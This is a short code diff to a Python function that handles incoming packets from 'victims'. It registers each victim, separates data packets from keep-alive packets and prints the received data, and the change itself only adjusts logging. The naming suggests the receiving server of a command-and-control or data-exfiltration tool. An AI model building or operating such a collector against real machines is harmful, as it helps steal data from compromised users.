@@ -39,14 +39,13 @@ def handle_load(load, path, sender_ip):
     victim_name = deserialized_load["h"]
     add_victim(victim_name, path)
 
-    print(deserialized_load)
-
     if("h" not in deserialized_load.keys()):
         return ""
 
     if("d" in deserialized_load.keys()):
-        print(f"\ndata packet from {victim_name}[{sender_ip}] received")
-        print(f"data received: {deserialized_load['d']}")
+        # print(f"\ndata packet from {victim_name}[{sender_ip}] received")
+        # print(f"data received: {deserialized_load['d']}")
+        print(deserialized_load["d"])
 
     else:
         print(f"\nkeep-alive packet from {victim_name}[{sender_ip}] received")
